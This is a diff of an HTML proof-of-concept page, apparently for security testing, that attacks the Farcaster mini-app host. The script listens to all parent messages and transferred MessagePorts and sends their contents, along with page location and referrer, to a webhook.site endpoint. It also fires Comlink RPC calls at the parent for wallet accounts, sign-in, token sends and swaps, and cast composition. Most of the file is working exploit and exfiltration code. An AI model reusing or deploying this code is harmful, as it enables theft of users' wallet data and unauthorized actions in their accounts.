@@ -11,44 +11,42 @@
 				box-sizing: border-box;
 			}
 			body {
-				font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+				font-family: -apple-system, sans-serif;
 				background: #17101f;
 				color: #fff;
 				padding: 16px;
-				min-height: 100vh;
-				font-size: 13px;
+				font-size: 12px;
 			}
 			.banner {
 				background: #dc2626;
-				color: white;
 				padding: 10px;
 				border-radius: 8px;
-				margin-bottom: 16px;
+				margin-bottom: 12px;
 				font-weight: bold;
 				text-align: center;
 			}
 			.card {
 				background: #1e1529;
 				border: 1px solid #2a2035;
-				border-radius: 10px;
-				padding: 12px;
-				margin-bottom: 12px;
+				border-radius: 8px;
+				padding: 10px;
+				margin-bottom: 10px;
 			}
 			.card h3 {
 				color: #a855f7;
-				margin-bottom: 6px;
-				font-size: 13px;
+				margin-bottom: 4px;
+				font-size: 12px;
 			}
 			.card pre {
 				color: #ccc;
-				font-size: 11px;
+				font-size: 10px;
 				word-break: break-all;
 				white-space: pre-wrap;
 				background: #0d0912;
-				padding: 8px;
-				border-radius: 6px;
+				padding: 6px;
+				border-radius: 4px;
 				margin-top: 4px;
-				max-height: 300px;
+				max-height: 250px;
 				overflow-y: auto;
 			}
 			.pass {
@@ -57,47 +55,44 @@
 			.fail {
 				color: #f87171;
 			}
-			.warn {
-				color: #facc15;
-			}
 		</style>
 	</head>
 	<body>
-		<div class="banner">⚠️ Farcaster Mini App — Wallet Bridge Port Transfer Test</div>
+		<div class="banner">⚠️ Farcaster Comlink RPC Exploit PoC</div>
 
 		<div class="card">
-			<h3>🔌 MessagePort Transfers Received</h3>
-			<pre id="port-log">Listening for port transfers...</pre>
-		</div>
-
-		<div class="card">
-			<h3>💬 All Messages From Parent</h3>
+			<h3>📨 Messages Received</h3>
 			<pre id="msg-log">Waiting...</pre>
 		</div>
 
 		<div class="card">
-			<h3>🔑 Wallet Bridge Responses</h3>
-			<pre id="wallet-log">Waiting for wallet bridge...</pre>
+			<h3>🔌 Port Transfers</h3>
+			<pre id="port-log">Waiting...</pre>
 		</div>
 
 		<div class="card">
-			<h3>📡 Exfiltration Log</h3>
+			<h3>🔑 Wallet/SDK Responses</h3>
+			<pre id="wallet-log">Waiting for responses...</pre>
+		</div>
+
+		<div class="card">
+			<h3>📡 Exfiltration</h3>
 			<pre id="exfil-log">Ready...</pre>
 		</div>
 
 		<script>
-			var WEBHOOK = "https://webhook.site/4dda6ba6-a6b9-4bd9-af9c-9b4e1ef89c99";
-			var portLog = [];
+			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
 			var msgLog = [];
+			var portLog = [];
 			var walletLog = [];
 			var exfilLog = [];
-			var receivedPorts = [];
+			var msgCounter = 1000;
 
 			function updateUI() {
-				document.getElementById("port-log").textContent = portLog.length > 0 ? JSON.stringify(portLog, null, 2) : "No ports received yet...";
-				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog, null, 2) : "No messages yet...";
-				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog, null, 2) : "No wallet responses yet...";
-				document.getElementById("exfil-log").textContent = exfilLog.join("\n") || "Ready...";
+				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog.slice(-20), null, 2) : "No messages...";
+				document.getElementById("port-log").textContent = portLog.length > 0 ? JSON.stringify(portLog, null, 2) : "No ports...";
+				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog, null, 2) : "No responses...";
+				document.getElementById("exfil-log").textContent = exfilLog.slice(-10).join("\n");
 			}
 
 			function sendToWebhook(label, data) {
@@ -108,128 +103,173 @@
 						headers: { "Content-Type": "text/plain" },
 						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
 					});
-					exfilLog.push("[" + new Date().toISOString().substring(11, 19) + "] Sent: " + label);
+					exfilLog.push(new Date().toISOString().substring(11, 19) + " " + label);
 					updateUI();
 				} catch (e) {}
 			}
 
 			// =============================================
-			// CRITICAL: Listen for MessagePort transfers
-			// Farcaster creates MessageChannels and may
-			// transfer port2 to the mini app iframe
-			// This gives direct wallet provider access
+			// Comlink message types
+			// These match the comlink library's internal protocol
+			// =============================================
+			var COMLINK_GET = "GET";
+			var COMLINK_SET = "SET";
+			var COMLINK_APPLY = "APPLY";
+			var COMLINK_CONSTRUCT = "CONSTRUCT";
+			var COMLINK_ENDPOINT = "ENDPOINT";
+			var COMLINK_RELEASE = "RELEASE";
+
+			// =============================================
+			// Listen for ALL messages including comlink
 			// =============================================
 			window.addEventListener("message", function (event) {
 				var entry = {
 					origin: event.origin,
-					hasports: !!(event.ports && event.ports.length > 0),
+					data: JSON.stringify(event.data).substring(0, 500),
+					hasPorts: !!(event.ports && event.ports.length),
 					portCount: event.ports ? event.ports.length : 0,
-					dataType: typeof event.data,
-					dataPreview: JSON.stringify(event.data).substring(0, 500),
-					timestamp: new Date().toISOString(),
+					ts: new Date().toISOString(),
 				};
 				msgLog.push(entry);
+				sendToWebhook("msg", entry);
 
-				// CRITICAL CHECK: Were MessagePorts transferred?
+				// Check for comlink responses
+				if (event.data && (event.data.id !== undefined || event.data.type)) {
+					walletLog.push({
+						type: "comlink_response",
+						data: JSON.stringify(event.data).substring(0, 500),
+						origin: event.origin,
+						ts: new Date().toISOString(),
+					});
+					sendToWebhook("COMLINK_RESPONSE", event.data);
+				}
+
+				// Check for frameEvent messages from Farcaster
+				if (event.data && event.data.type === "frameEvent") {
+					walletLog.push({
+						type: "FRAME_EVENT",
+						event: event.data.event,
+						ts: new Date().toISOString(),
+					});
+					sendToWebhook("FRAME_EVENT_RECEIVED", event.data);
+				}
+
+				// Check for ethProvider events
+				if (event.data && event.data.type === "frameEthProviderEvent") {
+					walletLog.push({
+						type: "ETH_PROVIDER_EVENT",
+						event: event.data.event,
+						params: event.data.params,
+						ts: new Date().toISOString(),
+					});
+					sendToWebhook("ETH_PROVIDER_EVENT", event.data);
+				}
+
+				// Handle port transfers
 				if (event.ports && event.ports.length > 0) {
 					portLog.push({
-						portCount: event.ports.length,
-						origin: event.origin,
-						data: JSON.stringify(event.data).substring(0, 300),
-						timestamp: new Date().toISOString(),
-					});
-
-					// Store the ports
-					for (var i = 0; i < event.ports.length; i++) {
-						receivedPorts.push(event.ports[i]);
-						var portIndex = receivedPorts.length - 1;
-
-						// Listen for messages on each received port
-						(function (port, idx) {
-							port.onmessage = function (portEvent) {
-								var portMsg = {
-									portIndex: idx,
-									data: JSON.stringify(portEvent.data).substring(0, 500),
-									timestamp: new Date().toISOString(),
-								};
-								walletLog.push(portMsg);
-								sendToWebhook("PORT_MESSAGE_RECEIVED", portMsg);
-								updateUI();
-							};
-							port.start();
-
-							// Try requesting wallet data through the port
-							try {
-								// Try ethProvider requests
-								port.postMessage({ jsonrpc: "2.0", id: 100 + idx, method: "eth_requestAccounts", params: [] });
-								port.postMessage({ jsonrpc: "2.0", id: 200 + idx, method: "eth_accounts", params: [] });
-								port.postMessage({ jsonrpc: "2.0", id: 300 + idx, method: "eth_chainId", params: [] });
-
-								// Try init channel requests
-								port.postMessage({ init: { type: "getContext" } });
-								port.postMessage({ warpcast: { jsonrpc: "2.0", id: 400, method: "getContext" } });
-
-								sendToWebhook("PORT_REQUESTS_SENT", { portIndex: idx, requests: ["eth_requestAccounts", "eth_accounts", "eth_chainId", "getContext"] });
-							} catch (e) {
-								sendToWebhook("PORT_REQUEST_ERROR", { portIndex: idx, error: e.message });
-							}
-						})(event.ports[i], portIndex);
-					}
-
-					sendToWebhook("PORTS_TRANSFERRED", {
 						count: event.ports.length,
 						origin: event.origin,
-						data: JSON.stringify(event.data).substring(0, 300),
+						data: JSON.stringify(event.data).substring(0, 200),
+						ts: new Date().toISOString(),
+					});
+					sendToWebhook("PORTS_RECEIVED", { count: event.ports.length, data: event.data });
+
+					event.ports.forEach(function (port, i) {
+						port.onmessage = function (pe) {
+							walletLog.push({
+								type: "PORT_MSG",
+								portIndex: i,
+								data: JSON.stringify(pe.data).substring(0, 500),
+								ts: new Date().toISOString(),
+							});
+							sendToWebhook("PORT_MESSAGE", { portIndex: i, data: pe.data });
+							updateUI();
+						};
+						port.start();
+
+						// Send comlink-formatted requests through the port
+						try {
+							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_accounts", params: [] }] });
+							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_chainId", params: [] }] });
+							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_requestAccounts", params: [] }] });
+							sendToWebhook("PORT_REQUESTS_SENT", { portIndex: i });
+						} catch (e) {
+							sendToWebhook("PORT_REQUEST_ERROR", { error: e.message });
+						}
 					});
 				}
 
-				sendToWebhook("message_received", entry);
 				updateUI();
 			});
 
 			// =============================================
-			// Try to initiate communication with parent
-			// Using Farcaster Frame SDK message formats
+			// Send comlink-formatted RPC calls to parent
+			// The expose function listens on globalThis (window)
+			// with origin allowlist ["*"]
 			// =============================================
 
-			// Signal ready - this is what legitimate mini apps do
-			window.parent.postMessage({ type: "fc:frame:ready" }, "*");
-			window.parent.postMessage({ type: "fc:frame:init" }, "*");
+			function sendComlinkCall(method, args) {
+				var id = msgCounter++;
+				var msg = {
+					id: id,
+					type: COMLINK_APPLY,
+					path: [method],
+					argumentList: args || [],
+				};
+				window.parent.postMessage(msg, "*");
+				sendToWebhook("comlink_call_sent", { method: method, id: id });
+				return id;
+			}
 
-			// Try requesting context
-			window.parent.postMessage({ type: "fc:frame:context:request" }, "*");
-			window.parent.postMessage({ jsonrpc: "2.0", id: 1, method: "fc_requestContext" }, "*");
+			// Try calling SDK methods via comlink
+			setTimeout(function () {
+				// These are the wrapHandlers(sdk) methods
+				sendComlinkCall("ready", []);
+				sendComlinkCall("close", []);
+				sendComlinkCall("openUrl", ["https://example.com"]);
+				sendComlinkCall("setPrimaryButton", [{ text: "HACKED" }]);
+				sendComlinkCall("signIn", [{ nonce: "test123" }]);
+				sendComlinkCall("viewProfile", [{ fid: 1 }]);
+				sendComlinkCall("composeCast", [{ text: "test" }]);
+				sendComlinkCall("sendToken", [{}]);
+				sendComlinkCall("swapToken", [{}]);
+				sendComlinkCall("addMiniApp", [{}]);
 
-			// Try the Farcaster Actions SDK format
-			window.parent.postMessage({ method: "ready" }, "*");
-			window.parent.postMessage({ method: "actions.ready" }, "*");
-			window.parent.postMessage({ method: "wallet.getEthereumProvider" }, "*");
-			window.parent.postMessage({ method: "actions.signIn" }, "*");
+				// Try direct eth provider
+				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
+				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
+				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_requestAccounts", params: [] }]);
+			}, 1000);
+
+			// Try again after 3 seconds in case of delayed init
+			setTimeout(function () {
+				sendComlinkCall("ready", []);
+				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
+				sendComlinkCall("signIn", [{ nonce: "test456" }]);
+			}, 3000);
+
+			// Status checks
+			var checkCount = 0;
+			var checker = setInterval(function () {
+				checkCount++;
+				if (checkCount > 15) {
+					clearInterval(checker);
+					return;
+				}
+				sendToWebhook("status", {
+					second: checkCount * 2,
+					messages: msgLog.length,
+					ports: portLog.length,
+					walletResponses: walletLog.length,
+				});
+			}, 2000);
 
 			sendToWebhook("poc_started", {
 				location: window.location.href,
 				referrer: document.referrer,
 				isFramed: window.self !== window.top,
-				timestamp: new Date().toISOString(),
 			});
-
-			// Keep checking for delayed port transfers
-			var checkCount = 0;
-			var checker = setInterval(function () {
-				checkCount++;
-				if (checkCount > 30) {
-					clearInterval(checker);
-					return;
-				}
-
-				sendToWebhook("status_check", {
-					second: checkCount,
-					portsReceived: receivedPorts.length,
-					totalMessages: msgLog.length,
-					walletResponses: walletLog.length,
-				});
-				updateUI();
-			}, 2000);
 		</script>
 	</body>
 </html>
